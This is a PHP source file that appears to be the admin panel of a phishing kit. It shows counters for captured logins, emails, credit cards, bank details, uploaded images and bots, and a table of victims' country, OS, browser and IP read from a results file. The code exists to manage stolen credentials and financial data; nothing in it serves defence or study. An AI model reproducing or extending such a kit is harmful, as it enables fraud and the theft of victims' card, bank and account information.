<?php
session_start();
require_once('../main.php');
require_once('function/session.php');
require_once('function/check-ressult.php');
if ($setting['auto_refresh'] == "on") {
require_once('function/auto_refresh.php');
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Required meta tags-->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="BAPAK KAU">
    <meta name="author" content="BAPAK KAU">
    <meta name="keywords" content="BAPAK KAU">
    <!-- Title Page-->
    <title><?= $title; ?> - Panel</title>
    <link id="favicon" rel="shortcut icon" href="images/icon/logo.png" type="image/png"/>
    <!-- Fontfaces CSS-->
    <link href="css/font-face.css" rel="stylesheet" media="all">
    <link href="vendor/font-awesome-4.7/css/font-awesome.min.css" rel="stylesheet" media="all">
    <link href="vendor/font-awesome-5/css/fontawesome-all.min.css" rel="stylesheet" media="all">
    <link href="vendor/mdi-font/css/material-design-iconic-font.min.css" rel="stylesheet" media="all">

    <!-- Bootstrap CSS-->
    <link href="vendor/bootstrap-4.1/bootstrap.min.css" rel="stylesheet" media="all">

    <!-- Vendor CSS-->
    <link href="vendor/animsition/animsition.min.css" rel="stylesheet" media="all">
    <link href="vendor/bootstrap-progressbar/bootstrap-progressbar-3.3.4.min.css" rel="stylesheet" media="all">
    <link href="vendor/wow/animate.css" rel="stylesheet" media="all">
    <link href="vendor/css-hamburgers/hamburgers.min.css" rel="stylesheet" media="all">
    <link href="vendor/slick/slick.css" rel="stylesheet" media="all">
    <link href="vendor/select2/select2.min.css" rel="stylesheet" media="all">
    <link href="vendor/perfect-scrollbar/perfect-scrollbar.css" rel="stylesheet" media="all">

    <!-- Main CSS-->
    <link href="css/theme.css" rel="stylesheet" media="all">

</head>

<body class="animsition">
    <div class="page-wrapper">
        <?php
        if ($os == "Android" or $os == "iPhone") {
           require_once('function/header-mobile.php');
        }else{
           require_once('function/header-desktop.php');
        }
        ?>
            <!-- MAIN CONTENT-->
            <div class="main-content">
                <div class="section__content section__content--p30">
                    <div class="container-fluid">
                        <div class="row">
                            <div class="col-md-12">
                                <div class="overview-wrap">
                                    <h2 class="title-1">statistic</h2>
                                    <form action="" method="post">
                                        <?php
                                        if ($setting['auto_refresh'] == "on") {
                                        echo '<input type="hidden" name="set_auto" value="off">';
                                        }else{
                                        echo '<input type="hidden" name="set_auto" value="on">';
                                        }

                                        $file = "function/setup.php";
                                        $isi = file_get_contents($file);

                                        if(isset($_POST['autorefresh'])) {
                                        $last = $setting['auto_refresh'];
                                        $new = $_POST['set_auto'];
                                        if(preg_match("#\b$last\b#is", $isi)) {
                                            $isi = str_replace($last,$new,$isi);
                                            $buka = fopen($file,'w');
                                            fwrite($buka,$isi);
                                            fclose($buka);
                                            echo "<script>window.location='';</script>";
                                        }
                                        else
                                             echo "<script>alert('Failed')</script>";
                                        }
                                        ?>
                                        <button class="au-btn au-btn-icon au-btn--blue" type="submit" name="autorefresh"><i class="zmdi zmdi-sync-alt"></i>auto refresh = <?= $setting['auto_refresh']; ?></button>
                                    </form>
                                </div>
                            </div>
                        </div>
                        <div class="row m-t-25">
                            <div class="col-sm-6 col-lg-3">
                                <div class="overview-item overview-item--c1">
                                    <div class="overview__inner">
                                        <div class="overview-box clearfix">
                                            <div class="icon">
                                                <i class="zmdi zmdi-mouse"></i>
                                            </div>
                                            <div class="text">
                                                <h2><?= $click; ?></h2>
                                                <span>CLICK</span>
                                            </div>
                                        </div>
                                        <div class="overview-chart">
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-sm-6 col-lg-3">
                                <div class="overview-item overview-item--c1">
                                    <div class="overview__inner">
                                        <div class="overview-box clearfix">
                                            <div class="icon">
                                                <i class="zmdi zmdi-account-o"></i>
                                            </div>
                                            <div class="text">
                                                <h2><?= $visitor; ?></h2>
                                                <span>VISITOR</span>
                                            </div>
                                        </div>
                                        <div class="overview-chart">
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-sm-6 col-lg-3">
                                <div class="overview-item overview-item--c1">
                                    <div class="overview__inner">
                                        <div class="overview-box clearfix">
                                            <div class="icon">
                                                <i class="zmdi zmdi-sign-in"></i>
                                            </div>
                                            <div class="text">
                                                <h2><?= $login; ?></h2>
                                                <span>LOGIN</span>
                                            </div>
                                        </div>
                                        <div class="overview-chart">
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-sm-6 col-lg-3">
                                <div class="overview-item overview-item--c1">
                                    <div class="overview__inner">
                                        <div class="overview-box clearfix">
                                            <div class="icon">
                                                <i class="zmdi zmdi-email"></i>
                                            </div>
                                            <div class="text">
                                                <h2><?= $email; ?></h2>
                                                <span>EMAIL</span>
                                            </div>
                                        </div>
                                        <div class="overview-chart">
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-sm-6 col-lg-3">
                                <div class="overview-item overview-item--c1">
                                    <div class="overview__inner">
                                        <div class="overview-box clearfix">
                                            <div class="icon">
                                                <i class="fa fa-images"></i>
                                            </div>
                                            <div class="text">
                                                <h2><?= $pap; ?></h2>
                                                <span>PAP</span>
                                            </div>
                                        </div>
                                        <div class="overview-chart">
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-sm-6 col-lg-3">
                                <div class="overview-item overview-item--c1">
                                    <div class="overview__inner">
                                        <div class="overview-box clearfix">
                                            <div class="icon">
                                                <i class="zmdi zmdi-card"></i>
                                            </div>
                                            <div class="text">
                                                <h2><?= $cc; ?></h2>
                                                <span>CREDIT CARD</span>
                                            </div>
                                        </div>
                                        <div class="overview-chart">
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-sm-6 col-lg-3">
                                <div class="overview-item overview-item--c1">
                                    <div class="overview__inner">
                                        <div class="overview-box clearfix">
                                            <div class="icon">
                                                <i class="fa fa-university"></i>
                                            </div>
                                            <div class="text">
                                                <h2><?= $bank; ?></h2>
                                                <span>BANK</span>
                                            </div>
                                        </div>
                                        <div class="overview-chart">
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-sm-6 col-lg-3">
                                <div class="overview-item overview-item--c1">
                                    <div class="overview__inner">
                                        <div class="overview-box clearfix">
                                            <div class="icon">
                                                <i class="zmdi zmdi-bug"></i>
                                            </div>
                                            <div class="text">
                                                <h2><?= $bot; ?></h2>
                                                <span>BOT</span>
                                            </div>
                                        </div>
                                        <div class="overview-chart">
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-lg-12">
                                <h2 class="title-1 m-b-25">VISITOR</h2>
                                <div class="table-responsive table--no-card m-b-40">
                                    <table class="table table-borderless table-striped table-earning">
                                        <thead>
                                            <tr>
                                                <th>country</th>
                                                <th>os</th>
                                                <th>browser</th>
                                                <th>ip</th>
                                                <th>date</th>
                                                <th>Activity</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <?php
                                              if(file_exists("../result/visitor.txt")){
                                              $bin = file_get_contents("../result/visitor.txt");
                                              $bin = explode("\n", $bin);
                                              $counny = count($bin);
                                              foreach($bin as $bins) {
                                                  $bins = explode("|", $bins);
                                                  $cn = $bins[0];
                                                  $os = $bins[1];
                                                  $br = $bins[2];
                                                  $ip = $bins[3];
                                                  $time = $bins[4];
                                                  $activity = $bins[5];
                                                  if($cn == "") {

                                                  }else{
                                                  echo "<tr>
                                                  <td>".$cn."</td>
                                                  <td>".$os."</td>
                                                  <td>".$br."</td>
                                                  <td>".$ip."</td>
                                                  <td>".$time."</td>
                                                  <td>".$activity."</td>
                                                  </tr>";
                                                  }
                                                  }
                                              }else{
                                                  echo "<tr><td>Oops :(</td><td></td><td></td><td></td><td></td><td></td></tr>";
                                              }
                                            ?>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-md-12">
                                <div class="copyright">
                                    <p>Copyright © 2021 <b><?= $title; ?></b></p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- END MAIN CONTENT-->
            <!-- END PAGE CONTAINER-->
        </div>

    </div>

    <!-- Jquery JS-->
    <script src="vendor/jquery-3.2.1.min.js"></script>
    <!-- Bootstrap JS-->
    <script src="vendor/bootstrap-4.1/popper.min.js"></script>
    <script src="vendor/bootstrap-4.1/bootstrap.min.js"></script>
    <!-- Vendor JS       -->
    <script src="vendor/slick/slick.min.js">
    </script>
    <script src="vendor/wow/wow.min.js"></script>
    <script src="vendor/animsition/animsition.min.js"></script>
    <script src="vendor/bootstrap-progressbar/bootstrap-progressbar.min.js">
    </script>
    <script src="vendor/counter-up/jquery.waypoints.min.js"></script>
    <script src="vendor/counter-up/jquery.counterup.min.js">
    </script>
    <script src="vendor/circle-progress/circle-progress.min.js"></script>
    <script src="vendor/perfect-scrollbar/perfect-scrollbar.js"></script>
    <script src="vendor/chartjs/Chart.bundle.min.js"></script>
    <script src="vendor/select2/select2.min.js">
    </script>
    <!-- Main JS-->
    <script src="js/main.js"></script>
</body>
</html>